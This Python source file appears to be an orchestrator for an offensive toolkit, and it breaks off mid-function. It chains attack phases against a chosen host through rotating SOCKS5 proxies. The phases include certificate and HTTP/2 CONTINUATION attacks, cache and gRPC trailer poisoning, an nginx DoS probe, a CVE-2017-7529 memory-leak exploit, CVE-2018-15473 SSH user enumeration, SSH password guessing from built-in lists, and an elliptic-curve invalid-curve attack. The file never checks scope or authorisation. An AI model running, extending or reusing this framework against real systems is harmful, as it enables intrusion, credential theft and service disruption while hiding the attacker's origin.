#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Integrated Orchestrator
Unifies all security modules with robust error handling, timeouts, and phase orchestration.

Design goals:
- Complete coverage of existing tools (no feature loss)
- Seamless data flow between phases (fingerprints -> cert/xDS/Wasm -> H2/GRPC/TLS13/EC)
- Strong error and timeout handling with clear, normalized results
- Configurable CLI (select phases, timeouts, parallelism, output format)
"""

from __future__ import annotations

import asyncio
import json
import sys
import time
import logging
from pathlib import Path


# Module-level logger to avoid NameError in free functions  
logger = logging.getLogger('integrated_orchestrator')

#  SYSTEM REFACTORING: Import shared communication infrastructure
try:
    from .shared_protocol_client import SharedProtocolClient, get_shared_client, cleanup_shared_clients
    SHARED_CLIENT_AVAILABLE = True
    logger.info(" Shared protocol client loaded - system refactoring active")
except ImportError:
    SHARED_CLIENT_AVAILABLE = False
    logger.warning(" Shared protocol client not available - using legacy implementations")

#  Universal Dynamic Integrator - 终极集成解决方案
try:
    # 尝试相对导入
    from .universal_integrator import UniversalIntegrator, integrate_all_modules
    UNIVERSAL_INTEGRATOR_AVAILABLE = True
    logger.info(" Universal Dynamic Integrator loaded - zero-loss integration active")
except ImportError:
    try:
        # 如果相对导入失败，尝试直接导入
        from universal_integrator import UniversalIntegrator, integrate_all_modules
        UNIVERSAL_INTEGRATOR_AVAILABLE = True
        logger.info(" Universal Dynamic Integrator loaded via direct import")
    except ImportError as e:
        UNIVERSAL_INTEGRATOR_AVAILABLE = False
        logger.warning(f" Universal Dynamic Integrator not available: {e}")

def _load_proxy_from_file(proxy_file: str) -> Optional[str]:
    """从文件加载代理URL"""
    try:
        proxy_path = Path(proxy_file)
        if not proxy_path.exists():
            print(f"[!] 代理文件不存在: {proxy_file}")
            print(f"[!] 创建文件并写入代理URL: echo 'socks5://user:pass@host:port' > {proxy_file}")
            return None
            
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxy_url = f.read().strip()
            
        if not proxy_url:
            print(f"[!] 代理文件为空: {proxy_file}")
            return None
            
        if not proxy_url.startswith('socks5://'):
            print(f"[!] 代理URL格式错误，必须以 socks5:// 开头")
            return None
            
        # 只显示前20个字符，隐藏密码
        safe_display = proxy_url[:20] + "***@" + proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url[:30] + "***"
        print(f"[+] 加载代理: {safe_display}")
        return proxy_url
        
    except Exception as e:
        print(f"[!] 读取代理文件失败: {e}")
        return None


from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, List, Optional
import re

# 导入统一代理管理器
try:
    from .unified_proxy_manager import init_global_proxy, get_proxy_manager, apply_proxy_to_module
    UNIFIED_PROXY_AVAILABLE = True
except ImportError:
    try:
        from unified_proxy_manager import init_global_proxy, get_proxy_manager, apply_proxy_to_module
        UNIFIED_PROXY_AVAILABLE = True
    except ImportError:
        UNIFIED_PROXY_AVAILABLE = False
        logger.warning("Unified Proxy Manager not available")
import time

# 简单的情报管理器 - 不过度工程化
class SimpleIntel:
    def __init__(self):
        self.data = {}
    
    def set(self, phase: str, result: Dict[str, Any]):
        self.data[phase] = result
    
    def get_server_type(self) -> str:
        fp = self.data.get('fingerprint', {})
        if 'server' in fp:
            return fp['server'].lower()
        return 'unknown'
    
    def get_san_domains(self) -> List[str]:
        cert = self.data.get('certificate_attacks', {})
        return cert.get('san_domains', [])


# -------- Utilities: error handling, timeouts, and normalization --------

@dataclass
class PhaseResult:
    name: str
    success: bool
    data: Dict[str, Any]
    error: Optional[str] = None
    duration_ms: int = 0


def _now_iso() -> str:
    return datetime.now().isoformat()


async def run_with_timeout(coro, timeout: float, phase_name: str) -> PhaseResult:
    start = time.perf_counter()
    try:
        result = await asyncio.wait_for(coro, timeout=timeout)
        duration_ms = int((time.perf_counter() - start) * 1000)
        # Normalize result into dict
        if isinstance(result, dict):
            data = result
        elif isinstance(result, (list, str, int, float, bool)):
            data = {"result": result}
        else:
            data = {"result": str(result)}
        return PhaseResult(name=phase_name, success=True, data=data, duration_ms=duration_ms)
    except asyncio.TimeoutError:
        duration_ms = int((time.perf_counter() - start) * 1000)
        return PhaseResult(name=phase_name, success=False, data={}, error=f"timeout after {timeout}s", duration_ms=duration_ms)
    except Exception as e:
        duration_ms = int((time.perf_counter() - start) * 1000)
        # 对于严重的代码错误，直接抛出异常中断执行
        if isinstance(e, (TypeError, AttributeError, ImportError, SyntaxError)):
            print(f"[FATAL] Critical code error in {phase_name}: {type(e).__name__}: {e}")
            raise e
        return PhaseResult(name=phase_name, success=False, data={}, error=f"{type(e).__name__}: {e}", duration_ms=duration_ms)


async def run_sync_in_thread(fn, *args, timeout: float = 10.0, phase_name: str, **kwargs) -> PhaseResult:
    async def _runner():
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, lambda: fn(*args, **kwargs))
    return await run_with_timeout(_runner(), timeout, phase_name)


def safe_import(module_name: str):
    try:
        return __import__(module_name, fromlist=['*'])
    except Exception as e:
        return e  # Return the exception for graceful handling


# -------- Adapters for each module --------

# ========== 增强的代理池管理 ==========
class ProxyPoolManager:
    """统一的代理池管理器，支持并发和故障转移"""
    
    def __init__(self, proxy_urls: List[str] = None):
        self.proxy_urls = proxy_urls or []
        self.current_index = 0
        self.lock = asyncio.Lock()
        self.failed_proxies = set()
        
    async def get_proxy(self) -> Optional[str]:
        """获取下一个可用代理"""
        async with self.lock:
            if not self.proxy_urls:
                return None
            
            # 跳过失败的代理
            attempts = 0
            while attempts < len(self.proxy_urls):
                proxy = self.proxy_urls[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_urls)
                
                if proxy not in self.failed_proxies:
                    return proxy
                attempts += 1
            
            # 如果所有代理都失败，重置失败列表重试
            if self.failed_proxies:
                logger.warning("All proxies failed, resetting failed list")
                self.failed_proxies.clear()
                return self.proxy_urls[0] if self.proxy_urls else None
            
            return None
    
    def mark_failed(self, proxy: str):
        """标记代理为失败"""
        self.failed_proxies.add(proxy)
        logger.warning(f"Marked proxy as failed: {proxy[:30]}...")

# 全局代理池实例
_global_proxy_pool: Optional[ProxyPoolManager] = None

def init_proxy_pool(proxy_urls: List[str]):
    """初始化全局代理池"""
    global _global_proxy_pool
    _global_proxy_pool = ProxyPoolManager(proxy_urls)
    logger.info(f"Initialized proxy pool with {len(proxy_urls)} proxies")

async def get_pooled_proxy() -> Optional[str]:
    """从代理池获取代理"""
    if _global_proxy_pool:
        return await _global_proxy_pool.get_proxy()
    return None

# ========== 增强的方法集成 ==========

async def phase_smart_detect(host: str, ports: List[int]) -> PhaseResult:
    phase = "smart_detection"
    mod = safe_import('smart_detector')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        results = mod.pre_detect_services(host, ports)
        return results

    return await run_with_timeout(_run(), 30.0, phase)


async def phase_fingerprint(host: str, tls_port: int, http_port: int, timeout: float, smart_ctx: Dict[str, Any] = None, proxy_url: Optional[str] = None, ssh_port: int = 22000) -> PhaseResult:
    phase = "fingerprint"
    mod = safe_import('fingerprint_proxy')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    # 设置proxy配置 
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            # 动态设置proxy配置
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # 同时更新模块内部的全局变量
        import fingerprint_proxy
        fingerprint_proxy.PROXY_URL = proxy_url
        fingerprint_proxy.PROXY_ENABLED = True

    data: Dict[str, Any] = {}
    tasks: List[asyncio.Task] = []

    # cert_rebel_probe (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.cert_rebel_probe, host, tls_port, [host], 22000, timeout,
            phase_name=f"{phase}.cert_rebel_probe"
        )))
    except Exception as e:
        data['cert_rebel_probe_error'] = str(e)

    # run_ssh_fp (sync) - 使用多端口检测
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_ssh_fp_multi_ports, host, timeout=timeout,
            phase_name=f"{phase}.ssh_fp"
        )))
    except Exception as e:
        data['ssh_fp_error'] = str(e)

    # run_tls_fp (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_tls_fp, host, tls_port, timeout=timeout, server_name=host,
            phase_name=f"{phase}.tls_fp"
        )))
    except Exception as e:
        data['tls_fp_error'] = str(e)

    # run_http_fp (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_http_fp, host, http_port, timeout=timeout,
            phase_name=f"{phase}.http_fp"
        )))
    except Exception as e:
        data['http_fp_error'] = str(e)

    # run_http_extreme_fp (sync) - optional stress
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_http_extreme_fp, host, http_port, timeout=timeout,
            phase_name=f"{phase}.http_extreme_fp"
        )))
    except Exception as e:
        data['http_extreme_error'] = str(e)

    # Gather
    async def _run():
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, PhaseResult):
                key = res.name.split('.', 1)[-1]
                if res.success:
                    data[key] = res.data.get('result') if 'result' in res.data else res.data
                    # 输出指纹工作成果
                    if key == 'ssh_fp' and res.data.get('result'):
                        print(f"[+] SSH fingerprint: {len(res.data['result'])} templates analyzed")
                    elif key == 'tls_fp' and res.data.get('result'):
                        print(f"[+] TLS fingerprint: {len(res.data['result'])} handshakes completed")
                    elif key == 'http_fp' and res.data.get('result'):
                        print(f"[+] HTTP fingerprint: {len(res.data['result'])} probes executed")
                    elif key == 'cert_rebel_probe' and res.data.get('result'):
                        cert_data = res.data['result']
                        if isinstance(cert_data, tuple) and len(cert_data) >= 2:
                            tls_rows, ssh_rows = cert_data[0], cert_data[1]
                            print(f"[+] Certificate analysis: {len(tls_rows)} certificates, {len(ssh_rows)} SSH keys")
                else:
                    data[f"{key}_error"] = res.error
                    print(f"[-] {key} failed: {res.error}")
            else:
                data.setdefault('errors', []).append(str(res))

        # 合并smart detection结果
        if smart_ctx:
            data['smart_detection'] = smart_ctx
            
        return data

    return await run_with_timeout(_run(), timeout, phase)


async def phase_cert_rebel(host: str, tls_port: int, timeout: float, fingerprint_ctx: Dict[str, Any], proxy_url: Optional[str] = None, origin_ip: Optional[str] = None) -> PhaseResult:
    phase = "certificate_attacks"
    
    # 在导入前设置代理配置，确保模块初始化时就能获取配置
    if proxy_url:
        import sys
        # 创建临时模块来设置全局代理变量
        temp_module = type(sys)('proxy_config')
        temp_module.PROXY_URL = proxy_url
        temp_module.PROXY_ENABLED = True
        sys.modules['proxy_config'] = temp_module
    
    mod = safe_import('cert_sociology')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    # 再次设置proxy配置，确保生效
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # 同时更新模块内部的全局变量
        import cert_sociology
        cert_sociology.PROXY_URL = proxy_url
        cert_sociology.PROXY_ENABLED = True

    async def _run():
        attacker = mod.CertRebelAttacks(host, tls_port, timeout=timeout, origin_ip=origin_ip)
        if hasattr(attacker, 'set_fingerprint_context') and fingerprint_ctx:
            attacker.set_fingerprint_context(fingerprint_ctx)
        return await attacker.run_all_attacks(None, None)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_ocsp(host: str, tls_port: int, timeout: float) -> PhaseResult:
    phase = "ocsp_validation"
    mod = safe_import('ocsp_validator')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        validator = mod.OCSPValidator(host, tls_port, timeout=timeout)
        return await validator.verify_ocsp_soft_fail()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_h2_continuation(host: str, tls_port: int, timeout: float, fingerprint_ctx: Dict[str, Any], cert_ctx: Dict[str, Any], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "h2_continuation"
    
    #  SYSTEM REFACTORING: Always use shared protocol client for stability
    if SHARED_CLIENT_AVAILABLE:
        # Test HTTP/2 connectivity with reliable shared client
        client = get_shared_client(host, tls_port, timeout=timeout)
        h2_result = await client.test_http2_connectivity()
        
        if not h2_result.get('supported', False):
            logger.info(f"HTTP/2 not supported via shared client, providing diagnostic report")
            return PhaseResult(name=phase, success=True, data={
                'http2_supported': False,
                'reason': h2_result.get('error', 'HTTP/2 not supported'),
                'diagnostics': h2_result.get('diagnostics', {}),
                'recommendations': h2_result.get('recommendations', []),
                'via_shared_client': True
            })
        
        logger.info("HTTP/2 connectivity verified via shared client, proceeding with CONTINUATION attacks")
        
        # 🆕 NEW: Use shared client for attacks instead of legacy h2_cfs
        async def _run():
            return await client.execute_h2_continuation_attacks()
        
        return await run_with_timeout(_run(), timeout, phase)
    
    else:
        logger.warning("Shared protocol client not available, using httpx-based HTTP/2 implementation")
    
    # Load h2_cfs module for actual attacks
    mod = safe_import('h2_cfs')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置proxy配置
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        attacker = mod.H2ContinuationConfusion(
            target_host=host, target_port=tls_port, timeout=timeout,
            fingerprint_data=fingerprint_ctx or {}, cert_data=cert_ctx or {}
        )
        return await attacker.run_all_attacks()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_h2_cache_poison(host: str, tls_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "h2_cache_poisoning"
    mod = safe_import('h2_push_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置proxy配置
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        tool = mod.H2PushPoisoning(host, tls_port, timeout=timeout)
        return await tool.run_poisoning_campaign()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_grpc(host: str, grpc_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "grpc_trailer_poisoning"
    mod = safe_import('grpc_trailer_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置proxy配置
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # 同时更新模块内部的全局变量
        import grpc_trailer_poisoning
        grpc_trailer_poisoning.PROXY_URL = proxy_url
        grpc_trailer_poisoning.PROXY_ENABLED = True

    async def _run():
        attacker = mod.GrpcTrailerPoisoning(host, grpc_port, timeout=timeout)
        return await attacker.run_comprehensive_assessment()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_xds(host: str, xds_port: int, timeout: float, event_cb=None) -> PhaseResult:
    phase = "xds_analysis"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, xds_port, timeout=timeout)
        if hasattr(analyzer, 'set_event_callback') and event_cb:
            analyzer.set_event_callback(event_cb)
        return await analyzer.comprehensive_xds_analysis()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_wasm(host: str, web_port: int, timeout: float, posture: str = 'intelligent') -> PhaseResult:
    phase = "wasm_runtime"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer.comprehensive_wasm_security_analysis(posture=posture)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_tls13_psk(host: str, tls_port: int, timeout: float, sni_list: Optional[List[str]], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "tls13_psk_crossbind"
    mod = safe_import('tls13_psk_crossbind')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置proxy配置
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        attacker = mod.TLS13PSKCrossBind(host, tls_port, timeout=timeout)
        snis = sni_list or [host]
        return await attacker.run_comprehensive_assessment(snis)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_ec_aoe(host: str, tls_port: int, timeout: float, protocols: Optional[List[str]], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "elliptic_curve_aoe"
    mod = safe_import('ec_aoe')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置proxy配置
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # 同时更新模块内部的全局变量
        import ec_aoe
        ec_aoe.PROXY_URL = proxy_url
        ec_aoe.PROXY_ENABLED = True

    async def _run():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        return await attacker.run_comprehensive_assessment(protos)

    # EC AOE优化策略：分层探测 + 动态超时调整
    # 对于分层探测，如果广度扫描发现异常端点很少，可以提前完成
    effective_timeout = 1800.0  # 💀 基础预算30分钟 - 暴力延长时间！
    
    async def _run_with_progress():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        
        # Start assessment with progress monitoring
        logging.info(f"EC AOE: Starting layered assessment with {effective_timeout}s budget")
        start_time = time.perf_counter()
        result = await attacker.run_comprehensive_assessment(protos)
        
        actual_duration = time.perf_counter() - start_time
        logging.info(f"EC AOE: Completed in {actual_duration:.1f}s (budget: {effective_timeout}s)")
        
        return result
    
    return await run_with_timeout(_run_with_progress(), effective_timeout, phase)


async def phase_nginx_dos(host: str, web_port: int, timeout: float) -> PhaseResult:
    phase = "nginx_dos_sandwich"
    mod = safe_import('nginx_dos_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.NginxDoSAnalyzer(host, web_port, timeout=timeout)
        probe = await analyzer.nginx_dos_sandwich_probe()
        # Also include external architecture detection for context
        arch = await analyzer.detect_cloud_native_architecture(scan_mode='external')
        return {"dos_analysis": probe, "cloud_native_analysis": arch}

    return await run_with_timeout(_run(), timeout, phase)


async def phase_universal_integration(host: str, port: int, timeout: float) -> PhaseResult:
    """ Universal Dynamic Integration - 零遗漏方法执行"""
    phase = "universal_integration"
    
    if not UNIVERSAL_INTEGRATOR_AVAILABLE:
        return PhaseResult(name=phase, success=False, data={}, error="Universal Integrator not available")
    
    async def _run():
        logger.info(" Starting Universal Dynamic Integration - Zero-Loss Mode")
        
        # 所有目标模块
        target_modules = [
            'h2_cfs',  # 操！这个核心模块竟然漏了！
            'wasm_runtime_analyzer',
            'nginx_dos_analyzer', 
            'grpc_trailer_poisoning',
            'tls13_psk_crossbind',
            'xds_protocol_analyzer',
            'proto_norm_diff_v2'
        ]
        
        # 执行零遗漏集成
        results = await integrate_all_modules(host, port, timeout * 2)  # 给足够时间
        
        # 统计成功率
        summary = results.get('execution_report', {}).get('summary', {})
        success_rate = summary.get('success_rate', 0)
        total_methods = summary.get('total', 0)
        successful_methods = summary.get('successful', 0)
        
        logger.info(f" Universal Integration Complete: {successful_methods}/{total_methods} methods ({success_rate:.1f}% success)")
        
        return {
            'integration_results': results,
            'summary': {
                'total_methods_discovered': total_methods,
                'successful_executions': successful_methods, 
                'success_rate': success_rate,
                'modules_processed': len(target_modules)
            }
        }
    
    return await run_with_timeout(_run(), timeout * 3, phase)  # 足够的超时时间


async def phase_time_mch_first_door(host: str, ssh_port: int, timeout: float) -> PhaseResult:
    phase = "time_mch_first_door"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        # Uses default user/password lists inside the module
        return await mod.first_door_attack(host, ssh_port)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_proto_norm_diff(host: str, tls_port: int, timeout: float, survey_only: bool = False, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "proto_norm_diff_survey" if survey_only else "proto_norm_diff"
    # 强制使用 v2 版本 (httpx-based, 不再fallback到手搓HTTP/2实现)
    mod = safe_import('proto_norm_diff_v2')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"proto_norm_diff_v2 import failed: {mod}. Legacy v1 is deprecated due to HTTP/2 connectivity issues.")
    
    tool_class = mod.ProtoNormDiffV2
    logger.info("Using proto_norm_diff v2 (httpx-based HTTP/2 implementation)")
    
    # 设置proxy配置（v2 版本暂时不支持代理，但保留兼容性）
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        tool = tool_class(host, tls_port, timeout=timeout)
        await tool.survey_topology()
        
        if survey_only:
            # 只返回快速 survey 结果，用于侦察阶段
            return {"survey": tool.survey}
        
        # 运行完整矩阵分析
        return await tool.run_matrix(None)

    # 优化超时管理：增加proto_norm_diff预算到300秒以支持并发优化
    effective_timeout = 300.0 if not survey_only else timeout
    return await run_with_timeout(_run(), effective_timeout, phase)


async def phase_cve_2017_7529(host: str, web_port: int, timeout: float, target_domain: Optional[str] = None) -> PhaseResult:
    """CVE-2017-7529 Nginx memory leak exploit"""
    phase = "cve_2017_7529"
    mod = safe_import('exploit_cve_2017_7529')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        # 使用 HTTPS 端口（通常与 TLS 端口相同）
        target_url = f"https://{host}:{web_port}/"
        leaker = mod.NginxMemoryLeaker(target_url)
        
        # 执行内存泄露攻击
        findings = leaker.targeted_leak()
        
        # 分析结果 - 准确判断漏洞状态
        has_206_responses = any('206' in str(f) for f in findings) if findings else False
        
        result = {
            'vulnerable': len(findings) > 0 and has_206_responses,
            'findings_count': len(findings),
            'findings': findings[:10],
            'risk_level': 'CRITICAL' if (findings and has_206_responses) else 'LOW',
            'version_vulnerable': True,  # nginx/1.12.2 is vulnerable by version
            'exploit_successful': len(findings) > 0 and has_206_responses,
            'analysis': 'Patched or behind WAF' if not has_206_responses else 'Active vulnerability'
        }
        
        # 如果提供了目标域名，也测试带 Host 头的请求
        if target_domain and findings:
            leaker.session.headers['Host'] = target_domain
            domain_findings = leaker.exploit()
            if domain_findings:
                result['domain_findings'] = domain_findings[:5]
                result['findings_count'] += len(domain_findings)
        
        return result

    return await run_with_timeout(_run(), timeout, phase)


# ========== 新增：proto_norm_diff 完整方法集成 ==========

async def phase_proto_norm_export_evidence(host: str, tls_port: int, timeout: float, out_dir: str, proxy_url: Optional[str] = None) -> PhaseResult:
    """导出proto_norm_diff的证据文件"""
    phase = "proto_norm_export_evidence"
    mod = safe_import('proto_norm_diff')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        effective_proxy = proxy_url or await get_pooled_proxy()
        tool = mod._DeprecatedProtoNormDiff(host, tls_port, timeout=timeout, proxy_url=effective_proxy)
        
        # 先运行分析
        await tool.run_matrix()
        
        # 导出证据
        tool.export_evidence(out_dir)
        
        return {"exported": True, "out_dir": out_dir, "files_created": ["heatmap.csv", "evidence.json"]}
    
    return await run_with_timeout(_run(), timeout * 2, phase)

async def phase_proto_norm_v2_analyze(host: str, tls_port: int, timeout: float, dimensions: Optional[List[str]] = None) -> PhaseResult:
    """proto_norm_diff_v2 增强分析（包含状态图）"""
    phase = "proto_norm_v2_analyze"
    mod = safe_import('proto_norm_diff_v2')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        tool = mod.ProtoNormDiffV2(host, tls_port, timeout=timeout)
        return await tool.analyze(dimensions=dimensions)
    
    return await run_with_timeout(_run(), timeout * 3, phase)

# ========== 新增：nginx_dos_analyzer 完整方法集成 ==========

async def phase_nginx_config_traps(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """检测Nginx配置陷阱"""
    phase = "nginx_config_traps"
    mod = safe_import('nginx_dos_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        analyzer = mod.NginxDoSAnalyzer(host, web_port, timeout=timeout)
        return await analyzer.detect_config_traps()
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== 新增：time_mch 完整方法集成 ==========

async def phase_cve_2018_15473_enum(host: str, port: int, userlist: List[str], timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
    """CVE-2018-15473 SSH用户枚举"""
    phase = "cve_2018_15473_enum"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        return await mod.cve_2018_15473_enum(host, port, userlist, timeout=timeout)
    
    return await run_with_timeout(_run(), timeout * len(userlist), phase)

async def phase_ssh_auth_timing(host: str, port: int, username: str, password: str, timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
    """SSH认证时间测量"""
    phase = "ssh_auth_timing"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        return await mod.ssh_auth_timing(host, port, username, password, timeout=timeout)
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== 新增：p256_elliptic 完整方法集成 ==========

async def phase_p256_invalid_curve_attack(host: str, tls_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """P-256椭圆曲线非法曲线攻击"""
    phase = "p256_invalid_curve"
    mod = safe_import('p256_elliptic')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        probe_factory = mod.ECProbeFactory()
        attacker = mod.InvalidCurveAttacker(host, probe_factory)
        results = await attacker.run_attack()
        
        return {
            "vulnerable": any(r.success for r in results),
            "results": [r.__dict__ for r in results],
            "risk_level": "HIGH" if any(r.success for r in results) else "LOW"
        }
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== 新增：wasm_runtime_analyzer 完整方法集成 ==========

async def phase_wasm_detect_runtime(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """检测WASM运行时环境"""
    phase = "wasm_detect_runtime"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer._detect_wasm_runtime()
    
    return await run_with_timeout(_run(), timeout, phase)

async def phase_wasm_timing_patterns(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """通过时序模式检测WASM编译缓存"""
    phase = "wasm_timing_patterns"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer._detect_via_timing_patterns()
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== 新增：xds_protocol_analyzer 完整方法集成 ==========

async def phase_xds_discover_services(host: str, xds_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """发现xDS服务和端点"""
    phase = "xds_discover_services"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, xds_port, timeout=timeout)
        return await analyzer._discover_xds_services()
    
    return await run_with_timeout(_run(), timeout, phase)

async def phase_xds_test_grpc_connection(host: str, port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """测试gRPC xDS连接"""
    phase = "xds_test_grpc_connection"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
